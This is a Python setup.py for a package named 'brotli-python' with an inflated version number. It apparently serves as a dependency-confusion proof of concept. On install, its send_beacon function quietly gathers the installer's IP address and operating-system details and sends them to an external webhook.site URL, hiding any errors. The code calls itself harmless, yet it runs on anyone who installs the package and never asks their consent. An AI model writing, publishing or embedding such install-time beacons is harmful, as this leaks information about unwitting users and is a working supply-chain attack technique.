from setuptools import setup
import urllib.request
import os

BEACON_URL = "https://webhook.site/66c4d84a-ac76-4b83-bb68-5a992164c7b7"

def send_beacon():
    try:
        # Include some system info in query parameters
        import platform, socket
        ip = socket.gethostbyname(socket.gethostname())
        sys_info = f"{platform.system()}_{platform.release()}"
        url = f"{BEACON_URL}?ip={ip}&sys={sys_info}"
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=3):
            pass
    except Exception:
        pass

# Run beacon during setup/install
send_beacon()

setup(
    name="brotli-python",
    version="99.6.1",
    packages=["brotli_python"],
    description="POC package capturing installer IP (harmless)",
)
